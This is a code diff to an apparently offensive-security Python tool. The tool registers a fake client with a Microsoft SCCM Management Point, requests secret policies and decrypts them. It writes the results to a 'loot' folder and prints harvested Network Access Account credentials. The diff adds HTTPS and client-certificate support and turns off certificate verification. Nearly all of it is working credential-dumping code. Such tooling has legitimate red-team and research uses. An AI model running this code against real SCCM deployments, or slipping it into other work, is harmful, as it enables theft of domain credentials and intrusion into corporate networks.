@@ -5,7 +5,6 @@ import base64
 import logging
 import requests
 import binascii
-import traceback
 import xml.etree.ElementTree                as ET
 
 from cryptography.hazmat.primitives         import serialization
@@ -21,7 +20,7 @@ from utils.deobfuscate_secret_policy_blob   import deobfuscate_secret_policy_blo
 from conf                               import bcolors, DATE_FORMAT, MP_INTERACTIONS_HEADERS, SCCMPoliciesDumpError
 
 logger = logging.getLogger(__name__)
-
+requests.packages.urllib3.disable_warnings()
 
 class PoliciesDumper():
 
@@ -30,7 +29,9 @@ class PoliciesDumper():
                  client_name,
                  use_existing_device,
                  machine_name,
-                 machine_pass
+                 machine_pass,
+                 pki_cert,
+                 pki_key
                 ):
         self.management_point = management_point
         self.output_dir = output_dir
@@ -38,8 +39,13 @@ class PoliciesDumper():
         self.use_existing_device = use_existing_device
         self.machine_name = machine_name
         self.machine_pass = machine_pass
+        self.pki_cert = pki_cert
+        self.pki_key = pki_key
         self.client_guid = ""
         self.secret_policies = {}
+        self.use_https = True if self.management_point.startswith('https://') else False
+        self.site_level_https_enforced = None
+
         
         # If we are not using an existing device, create and save self-signed certificates
         if self.use_existing_device is None:
@@ -67,6 +73,10 @@ class PoliciesDumper():
         self.session.headers.update(MP_INTERACTIONS_HEADERS)
         if machine_name is not None and machine_pass is not None and use_existing_device is None:
             self.session.auth = HttpNtlmAuth(machine_name, machine_pass)
+        if self.use_https:
+            logger.info("[*] HTTPS required. Using client certificate authentication")
+            self.session.cert = (pki_cert, pki_key)
+            self.session.verify = False
 
 
     @staticmethod
@@ -139,11 +149,19 @@ class PoliciesDumper():
         }
         if self.machine_name is not None and self.machine_pass is not None:
             r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system_windowsauth/request", headers={**self.session.headers, **additional_headers}, data=registration_request_payload)
-            if r.status_code != 200:
-                raise SCCMPoliciesDumpError(f"Authenticated registration endpoint returned a non-200 status code ({r.status_code}). Did you provide valid credentials?")
         else:
             r = self.session.request("CCM_POST", f"{self.management_point}/ccm_system/request", headers={**self.session.headers, **additional_headers}, data=registration_request_payload)
-        multipart_data = decoder.MultipartDecoder.from_response(r)
+        if r.status_code != 200:
+            err = f"Client registration request error with status code {r.status_code}"
+            logger.error(f"{bcolors.FAIL}[-] {err}{bcolors.ENDC}")
+            raise SCCMPoliciesDumpError(err)
+        try:
+            multipart_data = decoder.MultipartDecoder.from_response(r)
+        except:
+            err = f"Client registration request error - empty response from Management Point"
+            logger.error(f"{bcolors.FAIL}[-] {err}{bcolors.ENDC}")
+            raise SCCMPoliciesDumpError(err)
+
         for part in multipart_data.parts:
             if part.headers[b'content-type'] == b'application/octet-stream':
                 register_response = zlib.decompress(part.content).decode('utf-16')
@@ -156,8 +174,6 @@ class PoliciesDumper():
             f.write(f"{self.client_name}\n")
 
         logger.warning(f"{bcolors.OKGREEN}[+] Client registration complete - GUID: {self.client_guid}.{bcolors.ENDC}")
-        # After client registration was successful, we don't need NTLM authentication anymore for our session
-        self.session.auth = None
 
 
     def generate_policies_request_payload(self):
@@ -211,8 +227,17 @@ class PoliciesDumper():
             policies_json[policy.attrib["PolicyID"]] = {"PolicyVersion": policy.attrib["PolicyVersion"] if "PolicyVersion" in policy.attrib else "N/A",
                                             "PolicyType": policy.attrib["PolicyType"] if "PolicyType" in policy.attrib else "N/A",
                                             "PolicyCategory": policy.attrib["PolicyCategory"] if "PolicyCategory" in policy.attrib else "N/A",
-                                            "PolicyFlags": PoliciesDumper.parse_policies_flags(policy.attrib["PolicyFlags"]) if "PolicyFlags" in policy.attrib else "N/A",
-                                            "PolicyLocation": policy[0].text.replace("<mp>", self.management_point.split('http://')[1]) }
+                                            "PolicyFlags": PoliciesDumper.parse_policies_flags(policy.attrib["PolicyFlags"]) if "PolicyFlags" in policy.attrib else "N/A" }
+            if self.management_point.startswith('http://'):
+                policies_json[policy.attrib["PolicyID"]]["PolicyLocation"] = policy[0].text.replace("<mp>", self.management_point.split('http://')[1])
+            elif self.management_point.startswith('https://'):
+                policies_json[policy.attrib["PolicyID"]]["PolicyLocation"] = policy[0].text.replace("<mp>", self.management_point.split('https://')[1])
+            else:
+                policies_json[policy.attrib["PolicyID"]]["PolicyLocation"] = "N/A"
+
+            if self.use_https:
+                policies_json[policy.attrib["PolicyID"]]["PolicyLocation"] = policies_json[policy.attrib["PolicyID"]]["PolicyLocation"].replace('http://', 'https://')
+
     
         os.makedirs(f'loot/{self.output_dir}/policies/')
         with open(f'loot/{self.output_dir}/policies/policies.json', 'w') as f:
@@ -243,9 +268,14 @@ class PoliciesDumper():
                     else:
                         logger.warning(f"{bcolors.OKGREEN}[+] Retrieved NAA account credentials: {bcolors.BOLD}'{result[0]}:{result[1]}'{bcolors.ENDC}")
             except Exception as e:
-                traceback.print_exc()
+                logger.info("", exc_info=True)
                 logger.warning(f"{bcolors.FAIL}[-] Encountered an error when trying to process secret policy {key}{bcolors.ENDC}")
             logger.warning("\n")
+        if self.site_level_https_enforced is not None:
+            if self.site_level_https_enforced is True:
+                logger.warning("[*] Info: secret policies were transmitted unencrypted by the Management Point, meaning that HTTPS is enforced site-wide")
+            else:
+                logger.warning("[*] Info: secret policies were transmitted encrypted by the Management Point, meaning that HTTPS is NOT enforced site-wide")
 
 
     def request_policy(self, policy_url):
@@ -256,7 +286,9 @@ class PoliciesDumper():
             "ClientTokenSignature": SCCM_sign(self.private_key, f"GUID:{self.client_guid};{datetime.now().strftime(DATE_FORMAT)};2".encode('utf-16')[2:] + "\x00\x00".encode('ascii')).hex().upper()
         }
 
-        r = self.session.get(policy_url, headers={**self.session.headers, **additional_headers})
+        r = self.session.get(policy_url, headers={**self.session.headers, **additional_headers}, cert=(self.pki_cert, self.pki_key))
+        if r.status_code != 200:
+            logger.error(f"{bcolors.FAIL}[-] Policy request returned unexpected status code {r.status_code}{bcolors.ENDC}")
         return r.content
         
 
@@ -268,21 +300,32 @@ class PoliciesDumper():
         NAA_username = None
         NAA_password = None
         policy_response = self.request_policy(policy["PolicyLocation"])
-        decrypted = decrypt_secret_policy(policy_response, self.private_key)[:-1]
-        decrypted = clean_junk_in_XML(decrypted)
-        
+
+        if self.use_https is True:
+            # SCCM will not encrypt secret policy if Management Point is enforcing HTTPS, and HTTPS is required on the site level
+            try:
+                policy_response = policy_response.decode('utf-16')
+                self.site_level_https_enforced = True
+            except:
+            # However, if HTTPS is not required on the site level, secret policy will be encrypted (even though HTTPS is enforced on Management Point)
+                policy_response = decrypt_secret_policy(policy_response, self.private_key)[:-1]
+                self.site_level_https_enforced = False
+        else:
+            policy_response = decrypt_secret_policy(policy_response, self.private_key)[:-1]
+        policy_response = clean_junk_in_XML(policy_response)
+
         if policy["PolicyCategory"] == "CollectionSettings":
             logger.info("[INFO] Processing a CollectionSettings policy to extract collection variables")
-            root = ET.fromstring(decrypted)
+            root = ET.fromstring(policy_response)
             binary_data = binascii.unhexlify(root.text)
             decompressed_data = zlib.decompress(binary_data)
-            decrypted = decompressed_data.decode('utf16')
+            policy_response = decompressed_data.decode('utf16')
 
         with open(f'loot/{self.output_dir}/policies/{policyID}/policy.txt', 'w') as f:
-            f.write(decrypted)
+            f.write(policy_response)
         
         
-        root = ET.fromstring(decrypted)
+        root = ET.fromstring(policy_response)
         blobs_set = {}
         if policy["PolicyCategory"] == "CollectionSettings":
             for instance in root.findall(".//instance"):
